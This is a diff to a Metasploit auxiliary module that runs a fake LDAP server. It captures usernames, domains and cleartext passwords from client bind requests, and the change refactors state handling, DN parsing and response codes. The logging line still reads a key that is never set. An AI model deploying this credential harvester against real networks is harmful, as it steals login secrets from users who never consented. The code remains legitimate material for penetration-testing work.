@@ -2,6 +2,8 @@
 # This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
+require 'net/ldap'
+require 'net/ldap/dn'
 
 class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Report
@@ -34,15 +36,9 @@ class MetasploitModule < Msf::Auxiliary
     register_options(
       [
         OptAddress.new('SRVHOST', [ true, 'The localhost to listen on.', '0.0.0.0' ]),
-        OptPort.new('SRVPORT', [ true, 'The local port to listen on.', '389' ]),
-        OptString.new('Authentication', [ false, 'The type of authentication used by the client.', 'Simple' ])
+        OptPort.new('SRVPORT', [ true, 'The local port to listen on.', '389' ])
       ]
     )
-  end
-
-  def setup
-    super
-    @state = {}
   end
 
   def run
@@ -52,7 +48,9 @@ class MetasploitModule < Msf::Auxiliary
   def on_dispatch_request(client, data)
     return if data.strip.empty? || data.strip.nil?
 
-    @state[client] = {
+    state = {}
+
+    state[client] = {
       name: "#{client.peerhost}:#{client.peerport}",
       ip: client.peerhost,
       port: client.peerport
@@ -66,75 +64,90 @@ class MetasploitModule < Msf::Auxiliary
       res = case pdu.app_tag
             when Net::LDAP::PDU::BindRequest
               domains = []
+              names = []
+              result_code = nil
               user_login = pdu.bind_parameters
 
               if !user_login.name.empty?
                 if user_login.name =~ /@/
                   pub_info = user_login.name.split('@')
                   if pub_info.length <= 2
-                    @state[client][:user] = pub_info[0]
-                    @state[client][:domain] = pub_info[1]
+                    state[client][:user] = pub_info[0]
+                    state[client][:domain] = pub_info[1]
+                  else
+                    result_code = Net::LDAP::ResultCodeInvalidCredentials
+                    print_error("LDAP Login Attempt => From:#{state[client][:name]} DN:#{user_login.name}")
                   end
                 elsif user_login.name =~ /,/
-                  names = user_login.name.split(',')
-                  if names[0] =~ /cn=/
-                    @state[client][:user] = names.shift.split('=').last
-                  end
-                  names.each do |name|
-                    if name =~ /dc=/
-                      domains << name.split('=').last
+                  begin
+                    dn = Net::LDAP::DN.new(user_login.name)
+                    dn.each_pair do |key, value|
+                      if key == 'cn'
+                        names << value
+                      elsif key == 'dc'
+                        domains << value
+                      end
                     end
+                    state[client][:user] = names.first
+                    state[client][:domain] = domains.empty? ? nil : domains.join('.')
+                  rescue StandardError => e
+                    print_error("LDAP Login Attempt => From:#{state[client][:name]} DN:#{user_login.name}")
+                    raise e
                   end
-                  @state[client][:domain] = domains.join('.')
                 else
-                  service.encode_ldap_response(
-                    pdu.message_id,
-                    Net::LDAP::ResultCodeInvalidCredentials,
-                    '',
-                    '',
-                    Net::LDAP::PDU::BindResult
-                  )
+                  result_code = Net::LDAP::ResultCodeInvalidCredentials
                 end
               else
-                @state[client][:user] = ''
-                @state[client][:domain] = ''
+                state[client][:user] = ''
+                state[client][:domain] = nil
               end
 
-              @state[client][:pass] = user_login.authentication
+              state[client][:pass] = user_login.authentication
 
-              unless @state[client][:user].empty? && @state[client][:pass].empty?
+              unless state[client][:user].empty? && state[client][:pass].empty?
                 report_cred(
-                  ip: @state[client][:ip],
+                  ip: state[client][:ip],
                   port: client.localport,
                   service_name: 'ldap',
-                  user: @state[client][:user],
-                  password: @state[client][:pass],
-                  domain: @state[client][:domain]
+                  user: state[client][:user],
+                  password: state[client][:pass],
+                  domain: state[client][:domain]
                 )
               end
-              print_good("LDAP Login Attempt => From:#{@state[client][:name]} Username:#{@state[client][:user]} Password:#{@state[client][:password]}")
+              print_good("LDAP Login Attempt => From:#{state[client][:name]} Username:#{state[client][:user]} Password:#{state[client][:password]}")
+              result_code = Net::LDAP::ResultCodeAuthMethodNotSupported if result_code.nil?
               service.encode_ldap_response(
                 pdu.message_id,
-                Net::LDAP::ResultCodeAuthMethodNotSupported,
+                result_code,
                 '',
-                'Try Again or Use a different Authentication Method',
+                Net::LDAP::ResultStrings[result_code],
                 Net::LDAP::PDU::BindResult
               )
             else
+              result_code = Net::LDAP::ResultCodeUnwillingToPerform
               service.encode_ldap_response(
                 pdu.message_id,
-                Net::LDAP::ResultCodeUnwillingToPerform,
+                result_code,
                 '',
-                Net::LDAP::ResultStrings[Net::LDAP::ResultCodeUnwillingToPerform],
+                Net::LDAP::ResultStrings[result_code],
                 Net::LDAP::PDU::SearchResult
               )
             end
 
-      res.nil? ? client.close : on_send_response(client, res)
+      on_send_response(client, res) unless res.nil?
     rescue StandardError => e
+      on_send_response(client,
+                       service.encode_ldap_response(
+                         1,
+                         Net::LDAP::ResultCodeUnwillingToPerform,
+                         '',
+                         Net::LDAP::ResultStrings[result_code],
+                         Net::LDAP::PDU::BindResult
+                       ))
       print_error("Failed to handle LDAP request due to #{e}")
-      client.close
     end
+  ensure
+    client.close
   end
 
   def report_cred(opts)
